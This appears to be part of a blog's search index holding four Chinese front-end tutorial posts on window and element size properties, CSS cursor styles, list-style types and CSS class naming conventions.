      <url>%2F2016%2F01%2F20%2F4%2F</url>
      <content type="text"><![CDATA[最近在做项目中，涉及到获取浏览器和元素的高宽以及相关size。用的时候有些会有混淆，所以今天就来总结一下~ 一. window对象window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth 浏览器视口宽度（不包括工具栏和滚动条） window.inneHeight || document.documentElement.clientHeight || document.body.clientHeight 浏览器视口高度（不包括工具栏和滚动条） window.outerWidth 浏览器窗口的宽度(包含地址栏工具栏)(IE没有提供取得当前浏览器窗口尺寸的属性) window.outerHeight 浏览器窗口的高度 (包含地址栏工具栏)(IE没有提供取得当前浏览器窗口尺寸的属性) screen.width 显示屏幕的宽度 screen.height 显示屏幕的高度 screen.availHeight 返回显示屏幕的高度 (除 Windows 任务栏之外) screen.availWidth 返回显示屏幕的宽度 (除 Windows 任务栏之外) [转]页可见区域宽： document.body.clientWidth; 网页可见区域高： document.body.clientHeight; 网页可见区域宽： document.body.offsetWidth （包含边线的宽）; 网页可见区域高： document.body.offsetHeight （包含边线的宽）; 网页正文全文宽： document.body.scrollWidth; 网页正文全文高： document.body.scrollHeight; 网页被卷去的高： document.body.scrollTop; 网页被卷去的左： document.body.scrollLeft; 网页正文项目组上： window.screenTop; 网页正文项目组左： window.screenLeft; 屏幕辨别率的高： window.screen.height; 屏幕辨别率的宽： window.screen.width; 屏幕可用工作区高度： window.screen.availHeight; 二. 元素在网上找到这个图。 event.clientX 相对文档的水平座标 event.clientY 相对文档的垂直座标 event.offsetX 相对容器的水平坐标 event.offsetY 相对容器的垂直坐标 element.offsetWidth,element.offsetHeight: box 的总大小。包括 border, padding, content。不包括 margin element.clientWidth,element.clientHeight: box 中内容区域的大小。包括 padding, content不包括 margin, border scrollTop：已滚动过去的高度 scrollHeight：可滚动内容的总高度 offsetLeft:获取对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置 offsetTop:获取对象相对于版面或由 offsetTop 属性指定的父坐标的计算顶端位置 错误之处，还请大家多多指教~~]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[总结第二弹-光标形状]]></title>
      <url>%2F2016%2F01%2F18%2F3%2F</url>
      <content type="text"><![CDATA[小总结第二弹，今天来对光标形状进行下总结，光标形状有如下，上代码~~ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;p&gt;Mouse over the words to change the cursor.&lt;/p&gt; &lt;span style=&quot;cursor:auto&quot;&gt;auto&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:crosshair&quot;&gt;crosshair&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:default&quot;&gt;default&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:e-resize&quot;&gt;e-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:help&quot;&gt;help&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:move&quot;&gt;move&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:n-resize&quot;&gt;n-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:ne-resize&quot;&gt;ne-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:nw-resize&quot;&gt;nw-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:pointer&quot;&gt;pointer&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:progress&quot;&gt;progress&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:s-resize&quot;&gt;s-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:se-resize&quot;&gt;se-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:sw-resize&quot;&gt;sw-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:text&quot;&gt;text&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:w-resize&quot;&gt;w-resize&lt;/span&gt;&lt;br&gt; &lt;span style=&quot;cursor:wait&quot;&gt;wait&lt;/span&gt;&lt;br&gt; &lt;/body&gt; &lt;/html&gt; 小伙伴们可以直接还是可以直接粘去看效果的~~~今天的总结就这么多啦]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[列表样式总结]]></title>
      <url>%2F2016%2F01%2F15%2F2%2F</url>
      <content type="text"><![CDATA[今天在做项目的时候，用到了li的样式，然后就查了下li列表的样式有哪些。写出来，给大家做个参考~以后不用再找啦~ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; ul.a {list-style-type:circle;} ul.b {list-style-type:disc;} ul.c {list-style-type:square;} ol.d {list-style-type:armenian;} ol.e {list-style-type:cjk-ideographic;} ol.f {list-style-type:decimal;} ol.g {list-style-type:decimal-leading-zero;} ol.h {list-style-type:georgian;} ol.i {list-style-type:hebrew;} ol.j {list-style-type:hiragana;} ol.k {list-style-type:hiragana-iroha;} ol.l {list-style-type:katakana;} ol.m {list-style-type:katagana-iroha;} ol.n {list-style-type:lower-alpha;} ol.o {list-style-type:lower-greek;} ol.p {list-style-type:lower-latin;} ol.q {list-style-type:lower-roman;} ol.r {list-style-type:upper-alpha;} ol.s {list-style-type:upper-latin;} ol.t {list-style-type:upper-roman;} ol.u {list-style-type:none;} ol.v {list-style-type:inherit;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;ul class=&quot;a&quot;&gt; &lt;li&gt;Circle type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;b&quot;&gt; &lt;li&gt;Disc type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;c&quot;&gt; &lt;li&gt;Square type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ul&gt; &lt;ol class=&quot;d&quot;&gt; &lt;li&gt;Armenian type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;e&quot;&gt; &lt;li&gt;Cjk-ideographic type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;f&quot;&gt; &lt;li&gt;Decimal type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;g&quot;&gt; &lt;li&gt;Decimal-leading-zero type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;h&quot;&gt; &lt;li&gt;Georgian type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;i&quot;&gt; &lt;li&gt;Hebrew type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;j&quot;&gt; &lt;li&gt;Hiragana type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;k&quot;&gt; &lt;li&gt;Hiragana-iroha type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;l&quot;&gt; &lt;li&gt;Katakana type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;m&quot;&gt; &lt;li&gt;Katakana-iroha type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;n&quot;&gt; &lt;li&gt;Lower-alpha type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;o&quot;&gt; &lt;li&gt;Lower-greek type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;p&quot;&gt; &lt;li&gt;Lower-latin type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;q&quot;&gt; &lt;li&gt;Lower-roman type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;r&quot;&gt; &lt;li&gt;Upper-alpha type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;s&quot;&gt; &lt;li&gt;Upper-latin type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;t&quot;&gt; &lt;li&gt;Upper-roman type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;u&quot;&gt; &lt;li&gt;None type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;ol class=&quot;v&quot;&gt; &lt;li&gt;inherit type&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Coca Cola&lt;/li&gt; &lt;/ol&gt; &lt;/body&gt; &lt;/html&gt; 大家可以直接把代码粘过去看效果~~]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[css样式命名整理]]></title>
      <url>%2F2016%2F01%2F07%2F1%2F</url>
      <content type="text"><![CDATA[在做项目的过程中，经常会为命名的事情头疼。有时候标签多了，都不知道怎么命名，有经意就会有重复命名情况发生。所以抽空整理了命名例子出来。下面就来说一下自己总结的命名。 ###页面结构容器: container/wrap 整体宽度：wrapper 页头：header 内容：content 页面主体：main 页尾：footer 导航：nav 侧栏：sidebar 栏目：column 中间内容：center ###导航导航：nav 导航：mainbav/globalnav 子导航：subnav 顶导航：topnav 边导航：sidebar 左导航：leftsidebar 右导航：rightsidebar 边导航图标：sidebarIcon 菜单：menu 子菜单：submenu 标题: title 功能标志：logo 登陆：login 登录条：loginbar 注册：regsiter 产品：products 产品价格：productsPrices 产品评论：productsReview 编辑评论：editor-review 最新产品：news-release 广告/标语：banner 摘要:summary 生产商：publisher 缩略图：screenshot 常见问题：faqs 关键词：keyword 博客：blog 论坛：forum 搜索：search 搜索输入框：search-input 搜索输出：search-output 搜索结果：search-results 加入我们：joinus 状态：status 按钮：btn 滚动：scroll 标签页：tab 文章列表：list 提示信息：msg/message 当前的: current 小技巧：tips 皮肤：skin 充值：pay 活动：activities 推广：promotion 公告：announcement 排行：ranking 公司简介：companyProfile 公司设备：equipment 公司荣誉：glories 企业文化：culture 企业规模：scaleScale 营销网络：salesNetwork 组织机构：organization 技术力量：technology 分支机构：branches 企业资质：EnterpriseQualification 公司实力：strengthStrength 经营理念：operationPrinciple 经理致辞：manager_oration 发展历程：developmentHistory 工程案例：EngineeringProjects 分类浏览：browseByCategory 应用领域：applicationFields 人力资源：humanResourceHr 领导致辞： leader_oration 客户留言：customerMessage 客户服务：customerService 您的要求：yourRequirements 销售信息：salesInformation 招商：EnterpriseEstablishing 教育培训：EducationTraining 在线交流：onlineCommunication 质量认证：qualityCertification 合作加盟：joinInCooperation 产品描述：productsDescription 业务范围：businessScope 产品销售：salesSales 联系我们：contactUs 信息发布：Information 返回首页：homepage 产品定购：order 电子商务：E-business 版权所有：copy Right 友情连结：hot Link 行业新闻：tradeNews 行业动态：trends 邮编：postalCodeZipcode 新闻动态：newsTrends 公司名称：companyName 销售热线：salesHot_Line 联系人：contactPerson 建设中：InConstruction 证书：certificate 地址：ADD/Add 电话：TEL/Tel 传真：FAX/Fax 产品名称：productName 产品说明：description 价格：price 品牌：brand 规格：specification 尺寸：size 生产厂家：manufacuturer 型号：model 产品标号：Item No 技术指标：techniqueData 产品描述：description 产地：productionPlace 用途：application 论坛：Forum 在线订购：on_lineOrder 招标：bidInviting 综述：general 业绩：achievements 大事：greatEvent 动态：trends 服务：service 投资：Investment 行业：Industry 规划：programming 环境：environment 发送：delivery 提交：submit 重写：reset 社区：community 业务：business 在线调查：onlineInquiry 下载中心：download 意见反馈：feedback 常见问题：FAQ 中心概况：generalProfile 游乐园：amusementPark 专题报道：specialReport 图标: icon 注释：note 指南：guild 服务：service 热点：hot 新闻：news 下载：download 投票：vote 商标：label/branding 当前位置：breadcrumb/loc 购物车：shop 标签：tag 信誉：siteinfo-credits 网站信息：siteinfo 法律声明：siteinfo-legal 合作伙伴：partner 友情链接：friendlink 版权：copyright]]></content>
    </entry>

    
  
  
</search>
